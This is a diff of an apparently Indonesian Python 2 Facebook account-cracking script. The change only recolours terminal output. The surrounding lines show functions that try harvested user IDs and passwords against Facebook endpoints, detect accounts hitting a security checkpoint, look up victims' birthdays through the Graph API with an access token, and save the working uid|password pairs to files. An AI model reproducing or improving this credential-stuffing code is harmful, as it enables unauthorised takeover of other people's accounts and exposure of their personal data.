@@ -291,7 +291,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[0;95m[RAKA_AMANDA] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
+			print("\r\033[0;96m[RAKA_AMANDA] %s|%s|%s %s %s\033[0;96m"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -332,7 +332,7 @@ def bapi(user):
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[0;91m[RAKA_AMANDA] %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[0;96m[RAKA_AMANDA] %s|%s\033[0;96m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -385,7 +385,7 @@ def mbasic(user):
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;95m[RAKA_AMANDA] %s|%s\033[0;96m        "%(uid, pw))
+				print("\r\033[0;96m[RAKA_AMANDA] %s|%s\033[0;96m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -439,7 +439,7 @@ def mobile(user):
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;95m[RAKA_AMANDA] %s|%s\033[0;91m        "%(uid, pw))
+				print("\r\033[0;96m[RAKA_AMANDA] %s|%s\033[0;96m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -493,7 +493,7 @@ def manual():
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[0;95m[RAKA_AMANDA] %s|%s\033[0;91m        "%(uid, pw))
+					print("\r\033[0;96m[RAKA_AMANDA] %s|%s\033[0;96m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
